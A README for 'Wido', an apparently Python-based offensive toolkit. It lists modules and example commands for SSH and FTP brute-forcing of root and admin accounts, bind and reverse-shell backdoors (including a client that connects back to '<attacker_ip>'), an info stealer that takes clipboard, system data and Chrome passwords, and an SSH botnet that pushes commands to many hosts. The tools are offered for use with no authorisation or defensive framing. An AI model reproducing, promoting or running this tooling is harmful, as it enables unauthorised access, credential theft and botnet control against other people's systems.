# Wido: All-in-one Offensive Security Toolkit

A comprehensive offensive security toolkit with multiple modules:
- Port Scanner
- Hash Cracker
- SSH Brute-force
- FTP Brute-force
- Backdoor Shell (server/client)
- Backdoor Reverse Shell (server/client)
- Info Stealer (clipboard, system info, Chrome passwords placeholder)
- SSH Botnet
- Vulnerability Scanner
- Subdomain Finder
- Alive Subdomain Checker
- PDF Protection (add password to PDF)
- PDF Cracker (crack PDF password)
- Network Scanner (ping sweep)

## Installation

1. Clone this repository
2. Install dependencies:
```bash
pip install -r requirements.txt
pip install paramiko pyperclip psutil PyPDF2
```

## Usage

Show all modules and help:
```bash
python wido.py --help
```

### Example Commands

- **Port Scanner:**
  ```bash
  python wido.py port-scan --target 192.168.1.1 --ports 22,80,443,8000-8100
  ```
- **Hash Cracker:**
  ```bash
  python wido.py hash-crack --hashes hashes.txt --wordlist rockyou.txt
  ```
- **SSH Brute:**
  ```bash
  python wido.py ssh-brute --host 192.168.1.2 --user root --wordlist pass.txt
  ```
- **FTP Brute:**
  ```bash
  python wido.py ftp-brute --host 192.168.1.3 --user admin --wordlist pass.txt
  ```
- **Backdoor Server:**
  ```bash
  python wido.py backdoor-server --port 4444
  ```
- **Backdoor Client:**
  ```bash
  python wido.py backdoor-client --host 1.2.3.4 --port 4444
  ```
- **Backdoor Reverse Shell (Server):**
  ```bash
  python wido.py backdoor-reverse-server --port 4444
  ```
- **Backdoor Reverse Shell (Client):**
  ```bash
  python wido.py backdoor-reverse-client --host <attacker_ip> --port 4444
  ```
- **Info Stealer:**
  ```bash
  python wido.py info-stealer
  ```
- **SSH Botnet:**
  ```bash
  python wido.py ssh-botnet --hosts hosts.txt --command "ls -la"
  ```
- **Vulnerability Scanner:**
  ```bash
  python wido.py vuln-scan --path ./code
  ```
- **Subdomain Finder:**
  ```bash
  python wido.py subdomain --domain example.com
  ```
- **Alive Subdomains:**
  ```bash
  python wido.py alive-subdomains --input subdomains.txt --output alive.txt
  ```
- **PDF Protection:**
  ```bash
  python wido.py pdf-protect --input file.pdf --output protected.pdf --password secret
  ```
- **PDF Cracker:**
  ```bash
  python wido.py pdf-crack --input protected.pdf --wordlist words.txt
  ```
- **Network Scanner:**
  ```bash
  python wido.py network-scan --subnet 192.168.1.0/24
  ```

## Requirements

- Python 3.7+
- Standard modules: socket, threading, subprocess, hashlib, ftplib, argparse, etc.
- Extra modules:
  - paramiko (for SSH features)
  - pyperclip (for clipboard in info-stealer)
  - psutil (for system info in info-stealer)
  - PyPDF2 (for PDF features)
  - scanner.py (for vuln-scan, subdomain, alive-subdomains)

Install extra modules with:
```bash
pip install paramiko pyperclip psutil PyPDF2
```

## Contributing

Feel free to submit issues and enhancement requests! 